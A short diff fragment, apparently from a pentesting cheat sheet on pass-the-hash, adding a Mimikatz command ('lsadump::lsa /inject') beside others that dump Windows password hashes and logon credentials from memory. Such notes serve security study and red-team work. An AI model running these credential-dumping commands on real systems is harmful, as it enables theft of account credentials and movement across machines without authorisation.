@@ -6,6 +6,7 @@ Use the hash to login in another machine as a local user without knowing its pas
 
 ```
 lsadump::sam 
+lsadump::lsa /inject /name:<user>
 sekurlsa::logonpasswords
 ```
 
